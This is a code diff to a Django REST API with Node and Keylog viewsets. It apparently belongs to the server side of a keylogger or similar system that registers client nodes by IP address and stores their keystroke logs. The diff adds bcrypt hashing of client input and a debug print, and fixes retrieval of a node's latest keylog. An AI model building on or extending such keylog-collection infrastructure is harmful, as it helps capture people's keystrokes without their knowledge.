@@ -1,5 +1,5 @@
 from django.shortcuts import get_object_or_404
-from django.http import FileResponse, HttpResponse
+from django.http import FileResponse
 from django.utils import timezone
 
 from rest_framework import viewsets, status
@@ -10,10 +10,9 @@ from funguy_api.views.utils import get_ip
 from ..serializers import *
 from ..models import *
 
-from zipfile import ZipFile, ZipInfo
-from tempfile import TemporaryDirectory, TemporaryFile
-from io import BytesIO, StringIO
-import os
+from zipfile import ZipFile
+from io import BytesIO
+import bcrypt
 
 
 class NodeViewSet(viewsets.ViewSet):
@@ -33,13 +32,23 @@ class NodeViewSet(viewsets.ViewSet):
         return Response(serializer.data)
 
     def create(self, request):
+        # support creation of hash of mouse/mic random input
         request.data["ipv4"] = get_ip(request)
+
+        # generate hash_sum
+        random_input = request.data["random_input"].encode("utf-8")
+
+        hashed_random = bcrypt.hashpw(random_input, bcrypt.gensalt(10))
+        print(hashed_random)
+
+        request.data["hash_sum"] = hashed_random.decode("utf-8")
+
         serializer = NodeSerializer(data=request.data)
         if serializer.is_valid():
             serializer.save()
             return Response(serializer.data, status=status.HTTP_201_CREATED)
         # don't return errors = obfuscation
-        return Response(status=status.HTTP_400_BAD_REQUEST)
+        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
     def update(self, request, pk=None):
         node = get_object_or_404(Node, uuid=request.headers["uuid"])
@@ -92,8 +101,9 @@ class KeylogViewSet(viewsets.ViewSet):
 
         # get latest keylog
         try:
-            queryset = Keylog.objects.filter(node=node).latest("timestamp")
-            serializer = KeylogSerializer(queryset, many=True)
+            # get latest keylog object
+            keylog = Keylog.objects.filter(node=node).latest("timestamp")
+            serializer = KeylogSerializer(keylog)
 
             return Response(serializer.data, status=status.HTTP_200_OK)
         except TypeError:
